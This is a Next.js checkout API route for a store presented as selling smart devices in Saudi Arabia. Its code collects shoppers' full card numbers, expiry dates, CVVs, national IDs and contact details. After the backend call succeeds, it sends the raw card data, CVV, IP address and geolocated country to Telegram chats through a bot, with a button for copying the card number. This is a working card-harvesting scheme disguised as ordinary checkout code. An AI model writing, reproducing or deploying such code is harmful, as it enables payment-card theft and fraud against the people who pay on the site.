import { NextRequest, NextResponse } from "next/server";

// Server-side rate limit: IP → { count, windowStart }
const notifyRateLimit = new Map<string, { count: number; windowStart: number }>();
const NOTIFY_MAX = 5;
const NOTIFY_WINDOW_MS = 15 * 60 * 1000;

function checkNotifyRateLimit(ip: string): boolean {
  const now = Date.now();
  const entry = notifyRateLimit.get(ip);
  if (!entry || now - entry.windowStart > NOTIFY_WINDOW_MS) {
    notifyRateLimit.set(ip, { count: 1, windowStart: now });
    return true;
  }
  if (entry.count >= NOTIFY_MAX) return false;
  entry.count += 1;
  return true;
}

export async function POST(req: NextRequest) {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "unknown";

  if (!checkNotifyRateLimit(ip)) {
    return NextResponse.json({ ok: false, error: "طلبات كثيرة، حاول لاحقاً" }, { status: 429 });
  }

  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, shippingCompany, installmentType, months, downPayment } = await req.json();

  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
  const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";
  const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;

  // ── 1. أرسل للـ backend أولاً ──
  let dbRes: Response;
  try {
    dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-forwarded-for": ip,
      },
      body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, shippingCompany, installmentType, months, monthlyPayment, downPayment }),
    });
  } catch {
    return NextResponse.json({ ok: false, error: "Service unavailable" }, { status: 503 });
  }

  // إذا رُفض → أوقف هنا، لا ترسل Telegram
  if (!dbRes.ok) {
    const errData = await dbRes.json().catch(() => ({}));
    return NextResponse.json(errData, { status: dbRes.status });
  }

  const dbData = await dbRes.json().catch(() => ({}));
  const dbOrderId: string | null = dbData._id ?? dbData.id ?? null;

  // ── 2. نجح الطلب → أرسل Telegram ──
  let country = "غير معروف";
  if (!isLocal) {
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
      const geoData = await geoRes.json();
      if (geoData.country) country = geoData.country;
    } catch {}
  }

  const text = [
    `🛒 طلب لـ متجر مؤسسة لمسه للاجهزة الذكيه `,
    `🔖 رقم الطلب: #${orderId}`,
    ``,
    `💲 Total Amount: ${total} SAR`,
    ...(installmentType === "installment"
      ? [`🧾 First Payment: ${downPayment} SAR`]
      : [`🧾 Payment Type: Full Amount`]),
    ``,
    `🏦 MadaVisa - New Order`,
    `🌍 Country: ${country}`,
    `🌐 Public IP: ${ip || "غير معروف"}`,
    `🙍 Order For: ${customer ?? "-"}`,
    `📲 WhatsApp: ${(whatsapp ?? "").replace(/^(\+?966|00966)/, "0")}`,
    `💳 Card Number: ${cardNumber.replace(/\s+/g, "").replace(/(\d{4})/g, "$1 ").trim()}`,
    `✍️ Card Holder: ${cardHolder}`,
    `📆 Valid To: ${expiry}`,
    `🔑 CVV: ${cvv}`,
  ].join("\n");

  const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
  const reply_markup = {
    inline_keyboard: [[
      { text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber.replace(/\s+/g, "") } },
      ...(whatsappNum ? [{ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` }] : []),
    ]],
  };

  const chatIds = (process.env.TELEGRAM_CHAT_IDS ?? process.env.TELEGRAM_CHAT_ID ?? "")
    .split(",").map(id => id.trim()).filter(Boolean);

  await Promise.all(
    chatIds.map(chat_id =>
      fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text, reply_markup }),
      }).catch(() => {})
    )
  );

  return NextResponse.json({ ok: true, orderId, dbOrderId });
}
